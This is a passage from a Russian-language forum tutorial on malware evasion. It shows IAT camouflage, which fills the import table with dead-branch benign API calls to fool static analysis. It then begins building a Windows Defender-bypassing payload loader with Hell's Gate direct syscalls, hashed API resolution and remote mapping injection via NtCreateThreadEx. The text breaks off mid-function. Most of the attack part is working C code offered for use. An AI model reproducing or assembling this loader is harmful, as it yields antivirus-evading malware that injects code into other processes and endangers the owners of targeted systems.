	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
int main() {

      // бесконечное ожидание
    WaitForSingleObject((HANDLE)-1, INFINITE);
    return 0;
}</code></pre>
	</div>
</div><br />
Когда бинарный файл выполняется, Process Hacker выделит процесс розовым цветом и отобразит заметку, когда мышь наводится на процесс. Process Hacker предполагает, что бинарный файл упакован из-за отсутствия импорта в IAT.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788692294.png"
		data-src="https://osint42.org/attachments/1746788692294-png.302/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788692294-png.302/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788692294.png"
			title="1746788692294.png"
			width="1086" height="320" loading="lazy" />
	</div><br />
<br />
Убедитесь, что IatCamouflage.exe импортирует одну функцию с помощью dumpbin.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788698320.png"
		data-src="https://osint42.org/attachments/1746788698320-png.303/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788698320-png.303/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788698320.png"
			title="1746788698320.png"
			width="1432" height="522" loading="lazy" />
	</div><br />
<br />
<b>Манипуляция IAT</b><br />
<br />
Манипуляция IAT может быть легко выполнена с использованием доброжелательных WinAPI, которые не изменяют поведение программы. Это можно сделать, вызывая WinAPI с параметрами NULL или используя WinAPI на фиктивных данных, которые не повлияют на программу. Кроме того, эти функции могут размещаться в if-условиях, <b>которые никогда не будут выполняться.</b><br />
Тем не менее, некоторые компиляторы могут изменять ход выполнения кода с использованием оптимизации &quot;удаление мертвого кода&quot;. Это свойство оптимизации компилятора для удаления кода, который не влияет на работу программы.<br />
<br />
<b>Пример удаления мертвого кода</b><br />
<br />
В следующем фрагменте кода вызываются несколько функций WinAPI внутри if-условия, которое никогда не будет выполнено.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int z = 4;

// Невозможное if-условие, которое никогда не выполнится
if (z &gt; 5) {

    // Случайные доброжелательные WinAPI
    unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
    i = GetLastError();
    i = SetCriticalSectionSpinCount(NULL, NULL);
    i = GetWindowContextHelpId(NULL);
    i = GetWindowLongPtrW(NULL, NULL);
    i = RegisterClassW(NULL);
    i = IsWindowVisible(NULL);
    i = ConvertDefaultLocale(NULL);
    i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
    i = IsDialogMessageW(NULL, NULL);
}</code></pre>
	</div>
</div><br />
Если проект Visual Studio не имеет зависимости от библиотеки CRT и компилирует вышеуказанный код, то функции WinAPI не будут видны в IAT бинарного файла. Компилятор знает, что if-условие невозможно выполнить, и, следовательно, весь код if-условия не включается в скомпилированный бинарный файл, что приводит к тому, что функции WinAPI не будут в IAT бинарного файла. Существуют два способа решения этой проблемы:<br />
<ol>
<li data-xf-list-type="ol">Отключение оптимизации кода.</li>
<li data-xf-list-type="ol">Обман компилятора, чтобы он думал, что этот код используется.</li>
</ol><b>Отключение оптимизации кода</b><br />
<br />
Для этого метода необходимо просто отключить опцию оптимизации Visual Studio, как показано на изображении ниже. Это отключит свойство оптимизации компилятора &quot;удаление мертвого кода&quot;, что приведет к тому, что функции WinAPI будут видны в IAT. Однако отключение оптимизации на более крупных программах может негативно сказаться на производительности, поскольку компилятор больше не оптимизирует эффективность и скорость кода. Поэтому программа может потреблять больше памяти или работать медленнее.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788708650.png"
		data-src="https://osint42.org/attachments/1746788708650-png.304/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788708650-png.304/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788708650.png"
			title="1746788708650.png"
			width="1194" height="612" loading="lazy" />
	</div><br />
<br />
<br />
<b>Обман компилятора</b><br />
<br />
Для этого метода необходимо использовать логику, чтобы обмануть компилятор и заставить его думать, что if-условие может быть допустимым. В приведенном ниже фрагменте кода используется логика, которая делает сложно определить компилятору, будет ли if-условие выполняться, что заставляет его включить эту логику в скомпилированный бинарный файл, даже если if-условие никогда не будет удовлетворено.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Генерация случайного seed во время компиляции
int RandomCompileTimeSeed(void)
{
    return &#039;0&#039; * -40271
        __TIME__[7] * 1
        __TIME__[6] * 10
        __TIME__[4] * 60
        __TIME__[3] * 600
        __TIME__[1] * 3600
        __TIME__[0] * 36000;
}

// Функция-пустышка, делающая if-условие в &#039;IatCamouflage&#039; интересным
PVOID Helper(PVOID *ppAddress) {

    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
    if (!pAddress)
        return NULL;

    // Установка первых 4 байтов в pAddress равными случайному числу (меньше 255)
    *(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

    // Сохранение базового адреса по указателю и возврат его
    *ppAddress = pAddress;
    return pAddress;
}

// Функция, импортирующая WinAPI, но никогда их не использующая
VOID IatCamouflage() {

    PVOID        pAddress    = NULL;
    int*        A            = (int*)Helper(&amp;pAddress);

    // Невозможное if-условие, которое никогда не выполнится
    if (*A &gt; 350) {

        // Несколько случайных функций WinAPI
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
    }

    // Освобождение выделенного в &#039;Helper&#039; буфера
    HeapFree(GetProcessHeap(), 0, pAddress);
}</code></pre>
	</div>
</div><br />
Ниже приведены несколько моментов, чтобы облегчить понимание этого фрагмента кода.<br />
<br />
Функция RandomCompileTimeSeed используется для генерации случайного значения во время компиляции с использованием макроса <b>TIME</b>.<br />
<br />
Функция Helper выделяет кучу и устанавливает первые 4 байта равными значению RandomCompileTimeSeed() % 0xFF, что ограничивает значение числа, чтобы оно было меньше 0xFF (в шестнадцатеричной системе) или 255 (в десятичной системе).<br />
<br />
Функция IatCamouflage содержит переменную A, которая является указателем на целое число и устанавливается равной первым четырем байтам буфера, возвращенного функцией Helper.<br />
<br />
<b><u>Поскольку функция Helper всегда будет возвращать значение меньше 255, if-условие if (*A &gt; 350) всегда будет ложным. </u></b>Здесь интересно то, что компилятор не знает об этом и, следовательно, включит эту логику в скомпилированный бинарный файл.<br />
<br />
<b>Результаты </b><br />
<br />
Скомпилируйте приведенный выше фрагмент кода и проверьте IAT бинарного файла. Как и ожидалось, доброжелательные функции WinAPI внутри if-условия теперь видны.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788720435.png"
		data-src="https://osint42.org/attachments/1746788720435-png.305/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788720435-png.305/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788720435.png"
			title="1746788720435.png"
			width="1322" height="884" loading="lazy" />
	</div><br />
<br />
<b>Эти импортированные функции достаточно, чтобы сделать бинарный файл незаразным при статическом анализе. С другой стороны, вредоносные функции WinAPI должны быть удалены из IAT с использованием хэширования API.</b></div>
						

							<h2>Обход Windows defender</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746788137329.png"
		data-src="https://osint42.org/attachments/1746788137329-png.261/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788137329-png.261/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788137329.png"
			title="1746788137329.png"
			width="688" height="384" loading="lazy" />
	</div><br />
<br />
<b>Введение</b><br />
<br />
До сих пор было продемонстрировано множество методов и техник создания и выполнения загрузчика payload, который может обходить различные программы защиты от вредоносного кода. Эта статья будет работать над созданием полнофункционального загрузчика payload с нуля, чтобы укрепить знания, полученные в предыдущих разделах.<br />
<br />
Создайте пустой проект Visual Studio и следуйте за этим разделом.<br />
<br />
<b>Характеристики загрузчика payload </b><br />
<br />
Реализованный загрузчик payload будет иметь следующие характеристики:<br />
<br />
<ul>
<li data-xf-list-type="ul">Поддержка удаленного внедрения кода</li>
<li data-xf-list-type="ul">Инжекция с использованием прямых системных вызовов через Hell&#039;s Gate</li>
<li data-xf-list-type="ul">Хеширование API</li>
<li data-xf-list-type="ul">Функции против анализа</li>
<li data-xf-list-type="ul">Шифрование payload RC4</li>
<li data-xf-list-type="ul">Попытка взлома ключа шифрования (Брут ключа шифрования)</li>
<li data-xf-list-type="ul">Отсутствие импорта библиотек CRT</li>
</ul><br />
<b>Настройка Hell&#039;s Gate</b><br />
<br />
Этот загрузчик использует внедрение payload с использованием прямых системных вызовов, полученных с помощью Hell&#039;s Gate.<br />
Для начала необходимо создать файлы Structs.h, HellsGate.c и HellAsm.asm.<br />
<br />
В этих файлах содержатся необходимые функции для выполнения прямых системных вызовов. Файл Structs.h используется для сохранения недокументированных структур Windows и включается в последующие файлы C. В нем содержатся определения структур, таких как PEB, TEB и другие, необходимых для реализации Hell&#039;s Gate.<br />
<br />
Файл HellAsm.asm <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank" class="link link--external" rel="noopener">будет таким же, как в репозитории.</a> Что касается HellsGate.c, в нем будут следующие функции.<br />
<br />
HellsGate.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Получить заголовок DOS
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // Получить заголовки NT
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);
    if (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Получить EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

    for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry-&gt;uHash) {
            pVxTableEntry-&gt;pAddress = pFunctionAddress;

            // Быстрое и грязное исправление, если функция была перехвачена
            WORD cw = 0;
            while (TRUE) {
                // Проверить, является ли это системным вызовом, в этом случае мы слишком далеко
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // Проверить, является ли это возвратом, в этом случае, возможно, мы тоже слишком далеко
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // Первые байты должны быть:
                //    MOV R10, RCX
                //    MOV RCX, &lt;syscall&gt;
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    &amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    &amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    &amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    &amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
                    break;
                }

                cw++;
            };
        }
    }

    if (pVxTableEntry-&gt;wSystemCall != NULL)
        return TRUE;
    else
        return FALSE;
}</code></pre>
	</div>
</div><br />
Код выше не имеет определения структуры VX_TABLE_ENTRY или функции djb2. Для решения этой проблемы будут созданы два новых файла: WinApi.c и Common.h.<br />
<br />
WinApi.c - Этот файл используется для хранения функций замены библиотеки CRT и функций хеширования строк, используемых в Hell&#039;s Gate и реализации хеширования API.<br />
<br />
Common.h - Этот файл предоставляет общие прототипы функций для возможности вызова функции из другого файла, а также пользовательские определения структур, значения хешей системных вызовов и WinAPI.<br />
<br />
Функция хеширования строк djb2 заменяется следующими функциями HashStringJenkinsOneAtATime32BitA/W, изменяя таким образом исходный алгоритм хеширования строк, используемый в Hell&#039;s Gate.<br />
<br />
WinApi.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}</code></pre>
	</div>
</div><br />
<b>Common.h</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once
#include &lt;Windows.h&gt;

// Начальное значение для функции хеширования HashStringJenkinsOneAtATime32BitA/W в &#039;WinApi.c&#039;
#define INITIAL_SEED    8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

// Это прототипы функций - функции определены в &#039;HellsGate.c&#039;
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

// Это прототипы функций - функции определены в &#039;HellAsm.asm&#039;
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();</code></pre>
	</div>
</div><br />
Определите структуру VX_TABLE_ENTRY в файле Common.h, а затем обновите файл HellsGate.c, чтобы включить ее и использовать HASHA вместо djb2 в качестве функции хеширования.<br />
<br />
VX_TABLE_ENTRY<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    UINT32  uHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
<b>Вычисление хешей системных вызовов</b><br />
<br />
Для вычисления значений хешей системных вызовов и вывода их на консоль необходимо создать новый проект. Проект Hasher будет содержать один файл на C, который показан ниже.<br />
<br />
Hasher.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#define STR &quot;_JOAA&quot;
#define INITIAL_SEED 8

UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

int main() {

    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtMapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtMapViewOfSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtUnmapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtUnmapViewOfSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtClose&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtClose&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateThreadEx&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtWaitForSingleObject&quot;));

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Результаты Hasher</b><br />
<br />
После компиляции и запуска программа сгенерирует следующие результаты, которые следует скопировать в файл Common.h.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788161753.png"
		data-src="https://osint42.org/attachments/1746788161753-png.262/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788161753-png.262/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788161753.png"
			title="1746788161753.png"
			width="1048" height="194" loading="lazy" />
	</div><br />
<br />
Дополнительно, определение структуры новой структуры VX_TABLE должно быть обновлено, чтобы включить системные вызовы, которые будут использоваться.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {

    VX_TABLE_ENTRY NtCreateSection;
    VX_TABLE_ENTRY NtMapViewOfSection;
    VX_TABLE_ENTRY NtUnmapViewOfSection;
    VX_TABLE_ENTRY NtClose;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;

} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Внедрение Payload через Hell&#039;s Gate</b><br />
<br />
После успешной настройки Hell&#039;s Gate можно приступить к внедрению Payload. Создается новый файл Inject.c, который представлен ниже.<br />
<br />
<b>Следующие пункты кратко объясняют файл Inject.c:</b><br />
<ol>
<li data-xf-list-type="ol">InitializeSyscalls - Эта функция инициализирует глобальную переменную g_Sys типа VX_TABLE, которая будет использоваться позже.</li>
<li data-xf-list-type="ol">RemoteMappingInjectionViaSyscalls - Эта функция поддерживает как локальное, так и удаленное инъекцию через параметр bLocal, который устанавливается в TRUE для локальной инъекции и в FALSE для удаленной инъекции.</li>
<li data-xf-list-type="ol">Если параметр bLocal установлен в TRUE, переменная dwLocalFlag будет установлена в PAGE_EXECUTE_READWRITE, чтобы быть подходящей для локального выполнения Payload, и второй вызов NtMapViewOfSection будет избегаться. Но если bLocal установлен в FALSE, dwLocalFlag останется PAGE_READWRITE, и функция выполнит второй вызов NtMapViewOfSection для выделения памяти удаленно.</li>
<li data-xf-list-type="ol">Переменная pExecAddress используется для сохранения базового адреса внедренного Payload. Она равна базовому адресу локально внедренного Payload (pLocalAddress), если функция настроена на выполнение Payload локально, или базовому адресу удаленно внедренного Payload (pRemoteAddress), если функция настроена на выполнение Payload удаленно.</li>
<li data-xf-list-type="ol">Переменная pExecAddress затем передается в системный вызов NtCreateThreadEx для выполнения Payload в нужный момент времени.</li>
</ol>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

// Глобальная структура VX_TABLE
VX_TABLE g_Sys = { 0 };

BOOL InitializeSyscalls() {

    // Получить PEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return FALSE;

    // Получить модуль NTDLL
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Получить EAT NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return FALSE;

    g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
    g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
    g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
    g_Sys.NtClose.uHash = NtClose_JOAA;
    g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
    g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;

    // Инициализировать системные вызовы
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
        return FALSE;

    return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

        HANDLE          hSection          = NULL;
        HANDLE          hThread           = NULL;
        PVOID           pLocalAddress     = NULL,
                        pRemoteAddress    = NULL,
                        pExecAddress      = NULL;
        NTSTATUS        STATUS            = NULL;
        SIZE_T          sViewSize         = NULL;
        LARGE_INTEGER   MaximumSize       = {
              .HighPart = 0,
              .LowPart = sPayloadSize
        };

        DWORD           dwLocalFlag       = PAGE_READWRITE;

    //--------------------------------------------------------------------------
    // Выделение локальной карты
    HellsGate(g_Sys.NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if (bLocal) {
        dwLocalFlag = PAGE_EXECUTE_READWRITE;
    }

    HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Локальная память выделена по адресу: 0x%p размером : %d \n&quot;, pLocalAddress, sViewSize);

    //--------------------------------------------------------------------------
    // Запись Payload
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать Payload ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload скопирован с 0x%p по 0x%p \n&quot;, pPayload, pLocalAddress);

    //--------------------------------------------------------------------------
        // Выделение удаленной карты
        if (!bLocal) {

          HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
          if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
            printf(&quot;[!] NtMapViewOfSection [R] не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
          }

          printf(&quot;[+] Удаленная память выделена по адресу: 0x%p размером : %d \n&quot;, pRemoteAddress, sViewSize);

        }

    //--------------------------------------------------------------------------
    // Выполнение Payload через создание потока
    pExecAddress = pRemoteAddress;
    if (bLocal) {
        pExecAddress = pLocalAddress;
    }
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выполнить Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с начальным адресом 0x%p ... &quot;, pExecAddress);
    HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
